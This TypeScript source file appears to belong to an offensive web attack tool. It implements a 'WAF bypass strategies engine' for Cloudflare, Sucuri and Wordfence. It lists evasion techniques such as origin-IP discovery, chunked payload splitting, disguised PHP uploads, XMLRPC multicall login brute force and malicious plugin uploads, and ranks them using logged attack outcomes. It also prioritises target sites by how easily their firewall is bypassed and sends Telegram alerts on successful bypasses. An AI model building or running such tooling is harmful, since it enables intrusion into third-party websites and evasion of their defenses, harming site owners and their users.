/**
 * WAF-Specific Bypass Strategies Engine
 *
 * Provides intelligent, data-driven WAF bypass strategy selection for:
 *   - Cloudflare (Free, Pro, Business, Enterprise)
 *   - Sucuri (CloudProxy)
 *   - Wordfence (Free, Premium)
 *
 * Features:
 *   1. Static bypass profiles per WAF vendor (known techniques)
 *   2. Dynamic learning from historical bypass success/failure data
 *   3. WAF-aware target prioritization for orchestrator
 *   4. Bypass technique ranking with confidence scores
 *   5. Adaptive strategy rotation to avoid detection patterns
 */

import { getDb } from "./db";
import { wafDetections, strategyOutcomeLogs } from "../drizzle/schema";
import { eq, and, sql, desc, gte, isNotNull } from "drizzle-orm";
import { sendTelegramNotification } from "./telegram-notifier";

// ═══════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════

export interface WafBypassTechnique {
  name: string;
  description: string;
  category: "origin_discovery" | "encoding" | "header_manipulation" | "protocol" | "timing" | "payload_mutation" | "path_traversal" | "rate_evasion" | "auth_bypass";
  /** Static confidence (0-100) based on known effectiveness */
  baseConfidence: number;
  /** Learned confidence from historical data (null if no data) */
  learnedConfidence: number | null;
  /** Number of historical attempts */
  historicalAttempts: number;
  /** Number of historical successes */
  historicalSuccesses: number;
  /** Risk level: higher risk = more likely to trigger alerts */
  riskLevel: "low" | "medium" | "high";
  /** Estimated time to execute (ms) */
  estimatedDurationMs: number;
}

export interface WafBypassProfile {
  wafVendor: string;
  wafVariants: string[];
  /** Known weaknesses of this WAF */
  knownWeaknesses: string[];
  /** Known strengths to avoid */
  knownStrengths: string[];
  /** Ordered bypass techniques (best first) */
  techniques: WafBypassTechnique[];
  /** Overall bypass success rate from historical data */
  overallBypassRate: number | null;
  /** Total historical attempts against this WAF */
  totalAttempts: number;
  /** Total successful bypasses */
  totalSuccesses: number;
  /** Last updated timestamp */
  updatedAt: number;
}

export interface WafTargetingResult {
  /** Recommended WAF types to target (easiest to bypass) */
  targetWafTypes: string[];
  /** WAF types to avoid (hardest to bypass) */
  avoidWafTypes: string[];
  /** Per-WAF bypass rates */
  bypassRates: Record<string, { rate: number; attempts: number; successes: number }>;
  /** Strategy explanation */
  reasoning: string;
}

// ═══════════════════════════════════════════════
//  STATIC WAF BYPASS PROFILES
// ═══════════════════════════════════════════════

/** Cloudflare bypass techniques — ordered by effectiveness */
const CLOUDFLARE_TECHNIQUES: WafBypassTechnique[] = [
  {
    name: "origin_ip_discovery",
    description: "Find real origin IP via DNS history (SecurityTrails, Censys), Shodan, certificate transparency logs, or email headers to bypass Cloudflare proxy entirely",
    category: "origin_discovery",
    baseConfidence: 75,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 5000,
  },
  {
    name: "dns_history_lookup",
    description: "Query historical DNS records (A, AAAA, MX) from before Cloudflare was enabled to find original server IP",
    category: "origin_discovery",
    baseConfidence: 65,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 3000,
  },
  {
    name: "subdomain_scan_origin",
    description: "Scan subdomains (mail., ftp., cpanel., direct.) that may not be proxied through Cloudflare",
    category: "origin_discovery",
    baseConfidence: 60,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 10000,
  },
  {
    name: "ipv6_direct_access",
    description: "Try AAAA record — some sites only proxy IPv4 through Cloudflare, leaving IPv6 exposed",
    category: "protocol",
    baseConfidence: 40,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 2000,
  },
  {
    name: "websocket_upgrade",
    description: "Upgrade HTTP to WebSocket — Cloudflare Free/Pro may not inspect WS frames",
    category: "protocol",
    baseConfidence: 45,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 3000,
  },
  {
    name: "chunked_transfer_split",
    description: "Split malicious payload across multiple HTTP chunks — Cloudflare may only inspect first chunk",
    category: "encoding",
    baseConfidence: 50,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 2000,
  },
  {
    name: "http2_multiplexing",
    description: "Use HTTP/2 multiplexing to send multiple streams simultaneously — bypasses per-request rate limits",
    category: "protocol",
    baseConfidence: 35,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 2000,
  },
  {
    name: "cf_header_spoof",
    description: "Inject CF-Connecting-IP, X-Forwarded-For, True-Client-IP headers to spoof trusted internal traffic",
    category: "header_manipulation",
    baseConfidence: 30,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 1000,
  },
  {
    name: "cache_poisoning",
    description: "Poison Cloudflare cache with malicious response via Host header manipulation or cache key confusion",
    category: "header_manipulation",
    baseConfidence: 25,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "high",
    estimatedDurationMs: 5000,
  },
  {
    name: "unicode_normalization_cf",
    description: "Use Unicode normalization differences between Cloudflare WAF and backend server for payload evasion",
    category: "encoding",
    baseConfidence: 40,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 1500,
  },
  {
    name: "multipart_boundary_cf",
    description: "Manipulate multipart form boundary to confuse Cloudflare's body parser while backend accepts it",
    category: "payload_mutation",
    baseConfidence: 45,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 2000,
  },
  {
    name: "cf_workers_abuse",
    description: "If target uses Cloudflare Workers, exploit misconfigured routes or SSRF through worker endpoints",
    category: "path_traversal",
    baseConfidence: 20,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "high",
    estimatedDurationMs: 8000,
  },
];

/** Sucuri bypass techniques — ordered by effectiveness */
const SUCURI_TECHNIQUES: WafBypassTechnique[] = [
  {
    name: "origin_ip_discovery_sucuri",
    description: "Find real origin IP — Sucuri CloudProxy often leaves origin exposed via MX records, SPF, or DKIM headers",
    category: "origin_discovery",
    baseConfidence: 80,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 5000,
  },
  {
    name: "large_body_bypass",
    description: "Pad request body to >10MB — Sucuri CloudProxy skips inspection on oversized payloads to avoid latency",
    category: "payload_mutation",
    baseConfidence: 70,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 3000,
  },
  {
    name: "double_url_encoding_sucuri",
    description: "Double-encode URL parameters — Sucuri decodes once, backend decodes twice, revealing the real payload",
    category: "encoding",
    baseConfidence: 65,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 1500,
  },
  {
    name: "null_byte_injection_sucuri",
    description: "Insert null bytes in filenames/paths — Sucuri may truncate at null while backend processes full string",
    category: "encoding",
    baseConfidence: 55,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 1000,
  },
  {
    name: "content_type_confusion_sucuri",
    description: "Send PHP payload with image/jpeg Content-Type — Sucuri trusts Content-Type for inspection decisions",
    category: "payload_mutation",
    baseConfidence: 60,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 2000,
  },
  {
    name: "alternate_php_extensions",
    description: "Use .phtml, .php5, .php7, .pht, .phps extensions — Sucuri may only block .php explicitly",
    category: "payload_mutation",
    baseConfidence: 55,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 2000,
  },
  {
    name: "multipart_boundary_sucuri",
    description: "Manipulate multipart boundary with extra whitespace/semicolons — Sucuri's parser differs from Apache/Nginx",
    category: "payload_mutation",
    baseConfidence: 50,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 2000,
  },
  {
    name: "sucuri_cache_bypass",
    description: "Add random query params or POST to bypass Sucuri's caching layer and hit origin directly",
    category: "header_manipulation",
    baseConfidence: 40,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 1000,
  },
  {
    name: "php_data_wrapper",
    description: "Use php://input or data:// wrapper in include paths — Sucuri may not inspect PHP stream wrappers",
    category: "path_traversal",
    baseConfidence: 45,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 2000,
  },
  {
    name: "sucuri_ip_whitelist_abuse",
    description: "If site has IP whitelist configured in Sucuri, spoof X-Forwarded-For to match whitelisted ranges",
    category: "header_manipulation",
    baseConfidence: 30,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "high",
    estimatedDurationMs: 3000,
  },
];

/** Wordfence bypass techniques — ordered by effectiveness */
const WORDFENCE_TECHNIQUES: WafBypassTechnique[] = [
  {
    name: "rest_api_bypass",
    description: "Target /wp-json/ REST API endpoints — Wordfence Free has weaker rules on REST API vs wp-admin",
    category: "path_traversal",
    baseConfidence: 75,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 2000,
  },
  {
    name: "xmlrpc_multicall",
    description: "Use XMLRPC system.multicall to batch 500+ login attempts in a single request — bypasses per-request rate limits",
    category: "auth_bypass",
    baseConfidence: 70,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 5000,
  },
  {
    name: "ip_rotation_wordfence",
    description: "Rotate source IPs — Wordfence Free blocks by IP, rotating through proxies resets rate limits",
    category: "rate_evasion",
    baseConfidence: 80,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 1000,
  },
  {
    name: "user_agent_rotation",
    description: "Rotate User-Agent strings per request — Wordfence tracks suspicious UAs and blocks automated tools",
    category: "header_manipulation",
    baseConfidence: 65,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 500,
  },
  {
    name: "wf_cookie_bypass",
    description: "Obtain wfvt_ and wordfence_verifiedHuman cookies via headless browser to appear as verified human",
    category: "auth_bypass",
    baseConfidence: 60,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 8000,
  },
  {
    name: "slow_drip_timing",
    description: "Space requests 30-60s apart — Wordfence Free rate limit window is typically 1 min, slow drip stays under",
    category: "timing",
    baseConfidence: 70,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 60000,
  },
  {
    name: "plugin_upload_bypass",
    description: "Upload malicious plugin via wp-admin/plugin-install.php — Wordfence may not scan plugin ZIP contents in real-time",
    category: "payload_mutation",
    baseConfidence: 50,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 5000,
  },
  {
    name: "theme_editor_bypass",
    description: "Edit theme files via wp-admin/theme-editor.php — Wordfence Free doesn't block all file edit operations",
    category: "path_traversal",
    baseConfidence: 45,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "medium",
    estimatedDurationMs: 3000,
  },
  {
    name: "wf_scan_schedule_abuse",
    description: "Time attacks during Wordfence scan windows — the scanner consumes resources, weakening real-time protection",
    category: "timing",
    baseConfidence: 30,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "high",
    estimatedDurationMs: 5000,
  },
  {
    name: "geo_proxy_bypass",
    description: "Use proxies from same country as site owner — Wordfence Free doesn't geo-block, Premium may whitelist local IPs",
    category: "rate_evasion",
    baseConfidence: 55,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 2000,
  },
  {
    name: "wf_learning_mode_exploit",
    description: "If Wordfence is in Learning Mode (common after install), all traffic is allowed — detect via response patterns",
    category: "auth_bypass",
    baseConfidence: 40,
    learnedConfidence: null,
    historicalAttempts: 0,
    historicalSuccesses: 0,
    riskLevel: "low",
    estimatedDurationMs: 3000,
  },
];

// ═══════════════════════════════════════════════
//  STATIC PROFILE BUILDERS
// ═══════════════════════════════════════════════

function buildCloudflareProfile(): WafBypassProfile {
  return {
    wafVendor: "cloudflare",
    wafVariants: ["cloudflare", "cloudflare_free", "cloudflare_pro", "cloudflare_business", "cloudflare_enterprise"],
    knownWeaknesses: [
      "Free tier has limited WAF rules — only OWASP core",
      "Origin IP often discoverable via DNS history or email headers",
      "WebSocket frames not deeply inspected on Free/Pro",
      "IPv6 (AAAA) records sometimes not proxied",
      "Subdomains (mail, ftp, cpanel) often bypass proxy",
      "Chunked transfer encoding can split payloads across inspection boundaries",
      "Cache poisoning possible via Host header manipulation",
    ],
    knownStrengths: [
      "Enterprise has full managed WAF with custom rules",
      "Bot Management (Business+) detects headless browsers",
      "Rate limiting is aggressive on Pro+",
      "JS Challenge blocks most automated tools",
      "Under Attack Mode adds 5-second delay + CAPTCHA",
    ],
    techniques: [...CLOUDFLARE_TECHNIQUES],
    overallBypassRate: null,
    totalAttempts: 0,
    totalSuccesses: 0,
    updatedAt: Date.now(),
  };
}

function buildSucuriProfile(): WafBypassProfile {
  return {
    wafVendor: "sucuri",
    wafVariants: ["sucuri", "sucuri_cloudproxy", "sucuri_waf"],
    knownWeaknesses: [
      "Origin IP frequently exposed via MX/SPF/DKIM records",
      "Large body bypass (>10MB) — skips inspection for performance",
      "Content-Type trusted for inspection decisions",
      "Alternate PHP extensions (.phtml, .php5) often not blocked",
      "Multipart boundary parsing differs from Apache/Nginx",
      "Cache layer can be bypassed with query params",
    ],
    knownStrengths: [
      "Good at blocking known exploit signatures",
      "Virtual patching for WordPress vulnerabilities",
      "DDoS protection with CAPTCHA challenges",
      "File integrity monitoring detects changes",
    ],
    techniques: [...SUCURI_TECHNIQUES],
    overallBypassRate: null,
    totalAttempts: 0,
    totalSuccesses: 0,
    updatedAt: Date.now(),
  };
}

function buildWordfenceProfile(): WafBypassProfile {
  return {
    wafVendor: "wordfence",
    wafVariants: ["wordfence", "wordfence_free", "wordfence_premium"],
    knownWeaknesses: [
      "Free version: IP-based blocking only — easily bypassed with rotation",
      "REST API (/wp-json/) has weaker rules than wp-admin",
      "XMLRPC multicall allows batch operations in single request",
      "Free version lacks real-time firewall rule updates",
      "Learning Mode (post-install) allows all traffic",
      "Rate limit window is ~1 min — slow drip stays under",
      "Plugin/theme uploads not deeply scanned in real-time",
    ],
    knownStrengths: [
      "Premium has real-time firewall rule updates",
      "Premium blocks by country (geo-blocking)",
      "File change detection with email alerts",
      "Login security with 2FA (Premium)",
      "Malware scanner runs periodically",
    ],
    techniques: [...WORDFENCE_TECHNIQUES],
    overallBypassRate: null,
    totalAttempts: 0,
    totalSuccesses: 0,
    updatedAt: Date.now(),
  };
}

/** All static profiles */
const STATIC_PROFILES: Record<string, () => WafBypassProfile> = {
  cloudflare: buildCloudflareProfile,
  sucuri: buildSucuriProfile,
  wordfence: buildWordfenceProfile,
};

// ═══════════════════════════════════════════════
//  DYNAMIC LEARNING FROM HISTORICAL DATA
// ═══════════════════════════════════════════════

/**
 * Query historical WAF bypass success rates from strategy_outcome_logs
 * Returns per-technique success rates for a specific WAF vendor
 */
export async function getHistoricalWafBypassRates(wafVendor: string): Promise<{
  bypassRates: Record<string, { attempts: number; successes: number; rate: number }>;
  overallRate: number;
  totalAttempts: number;
  totalSuccesses: number;
}> {
  const db = await getDb();
  if (!db) return { bypassRates: {}, overallRate: 0, totalAttempts: 0, totalSuccesses: 0 };

  try {
    // Query all attacks against this WAF type
    const wafLike = `%${wafVendor}%`;
    const rows = await db.select({
      method: strategyOutcomeLogs.method,
      wafBypassUsed: strategyOutcomeLogs.wafBypassUsed,
      success: strategyOutcomeLogs.success,
    })
      .from(strategyOutcomeLogs)
      .where(sql`${strategyOutcomeLogs.wafDetected} LIKE ${wafLike}`)
      .limit(1000);

    const bypassRates: Record<string, { attempts: number; successes: number; rate: number }> = {};
    let totalAttempts = 0;
    let totalSuccesses = 0;

    for (const row of rows) {
      totalAttempts++;
      if (row.success) totalSuccesses++;

      // Track per-bypass-technique rates
      const bypasses = (row.wafBypassUsed as string[] | null) || [];
      for (const bypass of bypasses) {
        if (!bypassRates[bypass]) {
          bypassRates[bypass] = { attempts: 0, successes: 0, rate: 0 };
        }
        bypassRates[bypass].attempts++;
        if (row.success) bypassRates[bypass].successes++;
      }

      // Also track per-method rates
      const method = row.method || "unknown";
      if (!bypassRates[`method:${method}`]) {
        bypassRates[`method:${method}`] = { attempts: 0, successes: 0, rate: 0 };
      }
      bypassRates[`method:${method}`].attempts++;
      if (row.success) bypassRates[`method:${method}`].successes++;
    }

    // Calculate rates
    for (const key of Object.keys(bypassRates)) {
      const entry = bypassRates[key];
      entry.rate = entry.attempts > 0 ? (entry.successes / entry.attempts) * 100 : 0;
    }

    const overallRate = totalAttempts > 0 ? (totalSuccesses / totalAttempts) * 100 : 0;

    return { bypassRates, overallRate, totalAttempts, totalSuccesses };
  } catch (err: any) {
    console.warn(`[WafBypassStrategies] Historical data query failed: ${err.message}`);
    return { bypassRates: {}, overallRate: 0, totalAttempts: 0, totalSuccesses: 0 };
  }
}

/**
 * Get WAF detection frequency from waf_detections table
 * Returns how often each WAF is encountered
 */
export async function getWafDetectionStats(): Promise<{
  wafCounts: Record<string, number>;
  totalDetections: number;
  mostCommonWaf: string | null;
}> {
  const db = await getDb();
  if (!db) return { wafCounts: {}, totalDetections: 0, mostCommonWaf: null };

  try {
    const rows = await db.select({
      wafName: wafDetections.wafName,
      count: sql<number>`count(*)`.as("count"),
    })
      .from(wafDetections)
      .where(isNotNull(wafDetections.wafName))
      .groupBy(wafDetections.wafName)
      .orderBy(desc(sql`count(*)`));

    const wafCounts: Record<string, number> = {};
    let totalDetections = 0;
    let mostCommonWaf: string | null = null;

    for (const row of rows) {
      const name = (row.wafName || "unknown").toLowerCase();
      wafCounts[name] = row.count;
      totalDetections += row.count;
      if (!mostCommonWaf) mostCommonWaf = name;
    }

    return { wafCounts, totalDetections, mostCommonWaf };
  } catch (err: any) {
    console.warn(`[WafBypassStrategies] WAF detection stats query failed: ${err.message}`);
    return { wafCounts: {}, totalDetections: 0, mostCommonWaf: null };
  }
}

// ═══════════════════════════════════════════════
//  MAIN: GET WAF BYPASS PROFILE (Static + Dynamic)
// ═══════════════════════════════════════════════

/**
 * Get a complete WAF bypass profile enriched with historical data.
 * Combines static knowledge with learned bypass success rates.
 */
export async function getWafBypassProfile(wafVendor: string): Promise<WafBypassProfile> {
  const normalizedWaf = wafVendor.toLowerCase().replace(/[^a-z]/g, "");

  // Find matching static profile
  let profileBuilder = STATIC_PROFILES[normalizedWaf];
  if (!profileBuilder) {
    // Try fuzzy match
    for (const [key, builder] of Object.entries(STATIC_PROFILES)) {
      if (normalizedWaf.includes(key) || key.includes(normalizedWaf)) {
        profileBuilder = builder;
        break;
      }
    }
  }

  if (!profileBuilder) {
    // Return generic profile
    return {
      wafVendor: wafVendor,
      wafVariants: [wafVendor],
      knownWeaknesses: ["Unknown WAF — use generic bypass techniques"],
      knownStrengths: ["Unknown — proceed with caution"],
      techniques: [
        ...CLOUDFLARE_TECHNIQUES.filter(t => t.category === "encoding"),
        ...SUCURI_TECHNIQUES.filter(t => t.category === "payload_mutation"),
      ],
      overallBypassRate: null,
      totalAttempts: 0,
      totalSuccesses: 0,
      updatedAt: Date.now(),
    };
  }

  const profile = profileBuilder();

  // Enrich with historical data
  const historical = await getHistoricalWafBypassRates(normalizedWaf);

  if (historical.totalAttempts > 0) {
    profile.overallBypassRate = historical.overallRate;
    profile.totalAttempts = historical.totalAttempts;
    profile.totalSuccesses = historical.totalSuccesses;

    // Update technique confidence based on historical data
    for (const technique of profile.techniques) {
      const histData = historical.bypassRates[technique.name];
      if (histData && histData.attempts >= 2) {
        technique.learnedConfidence = histData.rate;
        technique.historicalAttempts = histData.attempts;
        technique.historicalSuccesses = histData.successes;
      }
    }

    // Re-sort techniques: learned confidence takes priority over base confidence
    profile.techniques.sort((a, b) => {
      const aConf = a.learnedConfidence !== null ? a.learnedConfidence : a.baseConfidence;
      const bConf = b.learnedConfidence !== null ? b.learnedConfidence : b.baseConfidence;
      return bConf - aConf;
    });
  }

  profile.updatedAt = Date.now();
  return profile;
}

// ═══════════════════════════════════════════════
//  WAF-AWARE TARGET PRIORITIZATION
// ═══════════════════════════════════════════════

/**
 * Analyze which WAF types are easiest to bypass based on historical data.
 * Used by orchestrator to prioritize targets with weaker WAFs.
 */
export async function getWafTargetingRecommendation(): Promise<WafTargetingResult> {
  const db = await getDb();
  if (!db) {
    return {
      targetWafTypes: ["wordfence", "sucuri"], // Default: these are generally easier
      avoidWafTypes: ["cloudflare_enterprise"],
      bypassRates: {},
      reasoning: "No historical data — using default WAF targeting (Wordfence Free > Sucuri > Cloudflare)",
    };
  }

  try {
    // Get bypass rates for all known WAF types
    const wafTypes = ["cloudflare", "sucuri", "wordfence"];
    const bypassRates: Record<string, { rate: number; attempts: number; successes: number }> = {};

    for (const waf of wafTypes) {
      const data = await getHistoricalWafBypassRates(waf);
      bypassRates[waf] = {
        rate: data.overallRate,
        attempts: data.totalAttempts,
        successes: data.totalSuccesses,
      };
    }

    // Sort by bypass rate (highest first)
    const sorted = Object.entries(bypassRates)
      .filter(([_, data]) => data.attempts >= 2) // Need at least 2 attempts
      .sort(([_, a], [__, b]) => b.rate - a.rate);

    const targetWafTypes = sorted
      .filter(([_, data]) => data.rate > 10) // Only target WAFs with >10% bypass rate
      .map(([waf]) => waf);

    const avoidWafTypes = sorted
      .filter(([_, data]) => data.rate < 5 && data.attempts >= 5) // Avoid WAFs with <5% after 5+ attempts
      .map(([waf]) => waf);

    // If no historical data, use default ordering
    if (targetWafTypes.length === 0) {
      return {
        targetWafTypes: ["wordfence", "sucuri", "cloudflare"],
        avoidWafTypes: [],
        bypassRates,
        reasoning: "Insufficient historical data — using default WAF targeting order: Wordfence (IP-based blocking) > Sucuri (origin IP leaks) > Cloudflare (proxy bypass)",
      };
    }

    const reasoning = sorted
      .map(([waf, data]) => `${waf}: ${data.rate.toFixed(1)}% bypass rate (${data.successes}/${data.attempts})`)
      .join(", ");

    return {
      targetWafTypes,
      avoidWafTypes,
      bypassRates,
      reasoning: `WAF targeting based on historical bypass rates: ${reasoning}`,
    };
  } catch (err: any) {
    console.warn(`[WafBypassStrategies] WAF targeting recommendation failed: ${err.message}`);
    return {
      targetWafTypes: ["wordfence", "sucuri"],
      avoidWafTypes: [],
      bypassRates: {},
      reasoning: `Error fetching data: ${err.message} — using defaults`,
    };
  }
}

// ═══════════════════════════════════════════════
//  SELECT BEST BYPASS TECHNIQUES FOR A TARGET
// ═══════════════════════════════════════════════

/**
 * Given a detected WAF, return the top N bypass techniques to try,
 * ordered by combined static + learned confidence.
 */
export async function selectBypassTechniques(
  wafName: string,
  options: {
    maxTechniques?: number;
    maxRiskLevel?: "low" | "medium" | "high";
    maxDurationMs?: number;
    excludeTechniques?: string[];
  } = {},
): Promise<{
  techniques: WafBypassTechnique[];
  profile: WafBypassProfile;
  reasoning: string;
}> {
  const {
    maxTechniques = 8,
    maxRiskLevel = "high",
    maxDurationMs = 120000,
    excludeTechniques = [],
  } = options;

  const riskOrder = { low: 1, medium: 2, high: 3 };
  const maxRisk = riskOrder[maxRiskLevel];

  const profile = await getWafBypassProfile(wafName);

  // Filter techniques by constraints
  let filtered = profile.techniques.filter(t => {
    if (riskOrder[t.riskLevel] > maxRisk) return false;
    if (t.estimatedDurationMs > maxDurationMs) return false;
    if (excludeTechniques.includes(t.name)) return false;
    return true;
  });

  // Take top N
  filtered = filtered.slice(0, maxTechniques);

  const reasoning = filtered.length > 0
    ? `Selected ${filtered.length} bypass techniques for ${wafName}: ${filtered.map(t => `${t.name} (${t.learnedConfidence !== null ? `learned:${t.learnedConfidence.toFixed(0)}%` : `base:${t.baseConfidence}%`})`).join(", ")}`
    : `No suitable bypass techniques found for ${wafName} with given constraints`;

  return { techniques: filtered, profile, reasoning };
}

// ═══════════════════════════════════════════════
//  TELEGRAM NOTIFICATION FOR WAF BYPASS SUCCESS
// ═══════════════════════════════════════════════

/**
 * Send Telegram notification when a WAF bypass succeeds
 */
export async function notifyWafBypassSuccess(
  wafName: string,
  technique: string,
  targetDomain: string,
  details: string,
): Promise<void> {
  try {
    await sendTelegramNotification({
      type: "success",
      targetUrl: `https://${targetDomain}`,
      details: [
        `🛡️ WAF BYPASS SUCCESS`,
        `WAF: ${wafName}`,
        `Technique: ${technique}`,
        `Target: ${targetDomain}`,
        `Details: ${details}`,
      ].join("\n"),
    });
  } catch (err: any) {
    console.warn(`[WafBypassStrategies] Telegram notification failed: ${err.message}`);
  }
}

// ═══════════════════════════════════════════════
//  EXPORTS FOR TESTING
// ═══════════════════════════════════════════════

export {
  CLOUDFLARE_TECHNIQUES,
  SUCURI_TECHNIQUES,
  WORDFENCE_TECHNIQUES,
  STATIC_PROFILES,
  buildCloudflareProfile,
  buildSucuriProfile,
  buildWordfenceProfile,
};
